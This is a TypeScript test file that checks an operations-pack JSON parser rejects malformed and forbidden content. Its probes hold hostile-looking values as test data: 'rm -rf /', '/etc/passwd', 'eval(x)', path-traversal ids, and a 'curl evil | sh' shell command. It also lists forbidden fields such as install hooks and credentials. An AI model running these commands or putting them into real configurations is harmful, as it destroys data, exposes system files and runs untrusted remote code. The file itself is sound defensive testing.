/**
 * @file test/operations-packs/pack-negative-sweep.test.ts
 * @description The operations-pack loader fails closed on every attack the
 * contract names (design sections 10, 14, 15, 19, WOP-INV-34): duplicate keys,
 * unknown top-level and nested fields, every forbidden-content class (section
 * 10.3, refused as an unknown field, an unknown recipe-body field, or — for a
 * registered template/intent id — an unsafe-identity refusal), unsafe and reserved
 * ids, the alias transport rule both ways, a per-kind input bound-violation sweep,
 * and each documented deferral (setting bindings, alias deprecation, readiness-rule
 * refs, and a pack-authored string rule-parameter or intent constant). Because
 * recipe phase bodies are now FULLY PARSED as closed shapes, a
 * render/intent body cannot represent a shell string, absolute/writable path, or
 * `eval(...)` expression; loosening a body id field to free-form text would redden
 * the witness cases below. Each probe is well-formed except the property under test.
 */

import { describe, expect, it } from "vitest";
import { parseOperationsPack } from "../../src/operations-packs/parse.js";
import { PackDeferredError, PackIdentityError, PackParseError } from "../../src/operations-packs/problems.js";
import { buildPack, serialize } from "./pack-fixture.js";
import { FINDING_CLASS_FIELD } from "../../src/operations-packs/handlers/reconcile.js";
import {
  CURRENT_BYTES_FIELD, CURRENT_DIGEST_FIELD,
} from "../../src/operations-packs/runtime/store-snapshot.js";

const text = serialize(buildPack());

/** Mutate the valid pack JSON so exactly one property is malformed. */
function mutated(fn: (pack: any) => void): () => void {
  const obj = JSON.parse(text);
  fn(obj);
  return () => parseOperationsPack(JSON.stringify(obj));
}

/** Both ends of a mapping must refuse host-owned reconciliation fields. */
function expectReservedMappingRefused(field: "targetField" | "ref"): void {
  for (const reserved of [FINDING_CLASS_FIELD, CURRENT_DIGEST_FIELD, CURRENT_BYTES_FIELD]) {
    expect(mutated((pack) => {
      pack.recipes["demo.prepare"].phases[2].body.intents[0].fieldMappings[0][field] = reserved;
    }), `must refuse ${field} ${reserved}`).toThrow(PackIdentityError);
  }
}

const FORBIDDEN_TOP_LEVEL_FIELDS = [
  "postinstallHook", "installHooks", "shellCommand", "credentials", "grants",
  "approvalProof", "absolutePath", "writablePaths", "expression", "storeWriter", "productDispatch",
];

const COMMON_FIELD = { required: true, overridable: true, sensitivityDisplay: "normal" };

/** One input field per kind, well-formed except a single violated bound. */
const BOUND_VIOLATIONS: Array<[Record<string, unknown>, typeof PackParseError | typeof PackIdentityError]> = [
  [{ ...COMMON_FIELD, kind: "enum", values: [] }, PackParseError],
  [{ ...COMMON_FIELD, kind: "string-list", maxItems: 0, maxItemBytes: 16 }, PackParseError],
  [{ ...COMMON_FIELD, kind: "integer", minimum: 5, maximum: 1 }, PackParseError],
  [{ ...COMMON_FIELD, kind: "number", minimum: 1.5, maximum: 0.5 }, PackParseError],
  [{ ...COMMON_FIELD, kind: "uri", allowedSchemes: ["ht!tp"], maxBytes: 64 }, PackIdentityError],
];

/** Forbidden section-10.3 content an author might try to smuggle into a recipe body. */
const FORBIDDEN_BODY = { command: "rm -rf /", absolutePath: "/etc/passwd", expression: "eval(x)", writablePath: "../../x" };

describe("operations pack negative sweep", () => {
  it("rejects a duplicate JSON key", () => {
    expect(() => parseOperationsPack(`${text.slice(0, -1)},"schemaVersion":2}`)).toThrow(PackParseError);
  });

  it("rejects an unknown top-level field", () => {
    expect(mutated((o) => { o.surpriseField = 1; })).toThrow(PackParseError);
  });

  it("rejects every forbidden-content class as an unknown field", () => {
    for (const field of FORBIDDEN_TOP_LEVEL_FIELDS) {
      expect(mutated((o) => { o[field] = "x"; })).toThrow(PackParseError);
    }
  });

  it("rejects a wrong schemaVersion", () => {
    expect(mutated((o) => { o.schemaVersion = 1; })).toThrow(PackParseError);
  });

  it("rejects an unsafe pack id", () => {
    expect(mutated((o) => { o.packId = "../evil"; })).toThrow(PackIdentityError);
  });

  it("rejects an unsafe action id", () => {
    expect(mutated((o) => { o.actions["demo.run"].actionId = "demo/run"; })).toThrow(PackIdentityError);
  });

  it("rejects a reserved action id", () => {
    const clash = JSON.parse(text);
    clash.actions["review.run"] = { ...clash.actions["demo.run"], actionId: "review.run" };
    delete clash.actions["demo.run"];
    expect(() => parseOperationsPack(JSON.stringify(clash))).toThrow(PackIdentityError);
  });

  it("rejects a reserved alias token", () => {
    expect(mutated((o) => { o.aliases[0].token = "help"; })).toThrow(PackIdentityError);
  });

  it("rejects an agent alias without a transport surface", () => {
    expect(mutated((o) => { o.aliases[0].surface = "agent"; })).toThrow(PackParseError);
  });

  it("rejects a non-agent alias that declares a transport surface", () => {
    expect(mutated((o) => { o.aliases[0].transportSurface = "cli"; })).toThrow(PackParseError);
  });

  it("rejects an unknown nested field", () => {
    expect(mutated((o) => { o.actions["demo.run"].surpriseField = 1; })).toThrow(PackParseError);
  });

  it("rejects an unknown input-field kind", () => {
    expect(mutated((o) => { o.actions["demo.run"].inputSchema.topic.kind = "callback"; })).toThrow(PackParseError);
  });

  it("rejects each per-kind input bound violation", () => {
    for (const [field, error] of BOUND_VIOLATIONS) {
      expect(mutated((o) => { o.actions["demo.run"].inputSchema.probe = field; })).toThrow(error);
    }
  });

  it("rejects an unbounded display name", () => {
    expect(mutated((o) => { o.displayName = "x".repeat(300); })).toThrow(PackParseError);
  });

  it("rejects a non-integer byte bound", () => {
    expect(mutated((o) => { o.actions["demo.run"].inputSchema.topic.maxBytes = 1.5; })).toThrow(PackParseError);
  });

  it("rejects an unknown recipe phase kind", () => {
    expect(mutated((o) => { o.recipes["demo.prepare"].phases[0].kind = "exec"; })).toThrow(PackParseError);
  });

  it("refuses a pack that declares imports", () => {
    expect(mutated((o) => { o.imports = []; })).toThrow(PackDeferredError);
  });

  it("refuses a non-empty settingSchema", () => {
    expect(mutated((o) => { o.settingSchema = { tone: { kind: "string" } }; })).toThrow(PackDeferredError);
  });

  it("refuses a non-empty deferred record field", () => {
    expect(mutated((o) => { o.contextRecipes = { main: {} }; })).toThrow(PackDeferredError);
  });

  it("refuses a declared action setting binding", () => {
    expect(mutated((o) => { o.actions["demo.run"].settingBindings = [{ settingId: "tone" }]; })).toThrow(PackDeferredError);
  });

  it("refuses a declared alias deprecation notice", () => {
    expect(mutated((o) => { o.aliases[0].deprecation = { since: "2.0.0" }; })).toThrow(PackDeferredError);
  });

  it("rejects a phase body carrying forbidden content as unknown fields", () => {
    expect(mutated((o) => { o.recipes["demo.prepare"].phases[0].body = FORBIDDEN_BODY; })).toThrow(PackParseError);
  });

  it("rejects a recipe inputContract carrying forbidden content as an unknown field", () => {
    expect(mutated((o) => { o.recipes["demo.prepare"].inputContract = { shellCommand: "curl evil | sh" }; })).toThrow(PackParseError);
  });

  it("refuses a render phase body whose templateRef is a forbidden value", () => {
    for (const forbidden of ["/etc/passwd", "eval(x)", "rm -rf /", "../../x"]) {
      expect(mutated((o) => { o.recipes["demo.prepare"].phases[1].body.templateRef = forbidden; })).toThrow(PackIdentityError);
    }
  });

  it("refuses an intent phase body whose intentTemplateRef is a forbidden value", () => {
    for (const forbidden of ["/etc/passwd", "eval(x)", "../../x"]) {
      expect(mutated((o) => { o.recipes["demo.prepare"].phases[2].body.intentTemplateRef = forbidden; })).toThrow(PackIdentityError);
    }
  });

  it("admits a lower-camelCase PAGE field target and refuses every unsafe shape", () => {
    // A page draft's target becomes a frontmatter KEY, and profile fields are
    // camelCase (`resultSummary`), so a slug-only target could not name — and
    // therefore could not PRESERVE — a declared field the whole-page replace
    // would otherwise drop. The widening stops exactly there.
    const target = (name: unknown) => mutated((o) => {
      o.recipes["demo.prepare"].phases[2].body.intents[0].fieldMappings[0].targetField = name;
    });
    expect(target("resultSummary"), "a declared camelCase profile field").not.toThrow();
    expect(target("result-summary"), "an existing slug still parses").not.toThrow();
    for (const unsafe of [
      "Result", "ResultSummary",     // uppercase-leading
      "result.summary", "a.b",        // dots
      "result[0]", "result summary",  // brackets, spaces
      "../result", "a/b",             // paths
      "result__summary", "resultSummaryX9_",
    ]) {
      expect(target(unsafe), `must refuse ${unsafe}`).toThrow(PackIdentityError);
    }
  });

  it("refuses a page-field target that the pipeline itself overwrites", () => {
    // Reconcile overlays its verdict on `finding-class`, and the snapshot
    // carries the update precondition on `current-digest`/`current-byte-count`.
    // A mapping targeting one would have its authored value silently replaced.
    // Pinned against the DEFINING constants so a rename cannot drift them apart.
    expectReservedMappingRefused("targetField");
  });

  it("refuses a reserved name as a mapping SOURCE ref, not only as a target", () => {
    // Reconcile restores the snapshot digest fields and overlays its verdict on
    // the item it passes on, so a mapping SOURCING one reads the pipeline's
    // value in place of the caller's — the same substitution as the target
    // case, one step earlier.
    expectReservedMappingRefused("ref");
    // CONTROL: an ordinary slug ref still parses, so the refusal is the
    // RESERVED name and not the ref check itself.
    expect(mutated((o) => {
      o.recipes["demo.prepare"].phases[2].body.intents[0].fieldMappings[0].ref = "ordinary-ref";
    })).not.toThrow();
    // And through the PROJECTION parser too: both mapping parsers share the
    // check, so a fix applied only to intent groups must not survive.
    expect(mutated((o) => {
      o.projections = {
        "project.demo": {
          projectionId: "project.demo", targetProfileClass: "wiki-page",
          fieldMappings: [{ targetField: "title", source: "phase-input", ref: CURRENT_DIGEST_FIELD }],
        },
      };
    })).toThrow(PackIdentityError);
  });

  it("keeps RELATION mappings on the slug-only vocabulary", () => {
    // The page-field widening is scoped by mutation KIND: a relation draft's
    // structural keys must stay slug-expressible (see materializer-obligation).
    // The CONTROL pins its own precondition: switching the kind alone must
    // parse, so the refusal below is attributable to the camelCase target and
    // not to some unrelated relation-shape rule.
    expect(mutated((o) => {
      o.recipes["demo.prepare"].phases[2].body.intents[0].mutationKind = "relation-upsert";
    }), "the kind switch alone is legal").not.toThrow();
    expect(mutated((o) => {
      const group = o.recipes["demo.prepare"].phases[2].body.intents[0];
      group.mutationKind = "relation-upsert";
      group.fieldMappings[0].targetField = "resultSummary";
    })).toThrow(PackIdentityError);
  });

  it("rejects an intent constant mapping loosened to an arbitrary-JSON value", () => {
    expect(mutated((o) => { o.recipes["demo.prepare"].phases[2].body.intents[0].fieldMappings[1].value = { $eval: "x" }; })).toThrow(PackParseError);
  });

  it("admits a BOUNDED string intent constant and refuses an unbounded one", () => {
    // Deliberate relaxation: an intent constant lands in a content-addressed,
    // pre-apply-reviewed payload, so a bounded control-free string (a pinned
    // relation type, a fixed literal value) is representable pack content. The
    // BOUNDS are the contract that remains: control characters and oversize
    // strings still refuse, and rule parameters stay string-free (next case).
    expect(mutated((o) => { o.recipes["demo.prepare"].phases[2].body.intents[0].fieldMappings[1].value = "/etc/passwd"; })).not.toThrow();
    expect(mutated((o) => { o.recipes["demo.prepare"].phases[2].body.intents[0].fieldMappings[1].value = "x".repeat(5000); })).toThrow(PackParseError);
  });

  it("refuses a pack-authored string rule parameter (deferred to the compiler slice)", () => {
    expect(mutated((o) => {
      o.recipes["demo.prepare"].phases.push({
        phaseId: "check", kind: "validate", dependencies: [], disposition: "required",
        inputBindings: [], outputSchema: [{ fieldId: "verdict", valueKind: "boolean" }],
        bounds: { maxItems: 1, maxOutputBytes: 4096 }, missingInputDisposition: "fail",
        body: { ruleBindings: [{ ruleId: "rule.check", ruleVersion: "1.0.0", parameters: [{ paramId: "threshold", value: "high" }] }] },
      });
    })).toThrow(PackDeferredError);
  });

  it("refuses a non-empty action readinessRuleRefs at parse", () => {
    expect(mutated((o) => { o.actions["demo.run"].readinessRuleRefs = ["rule.ready"]; })).toThrow(PackDeferredError);
  });
});
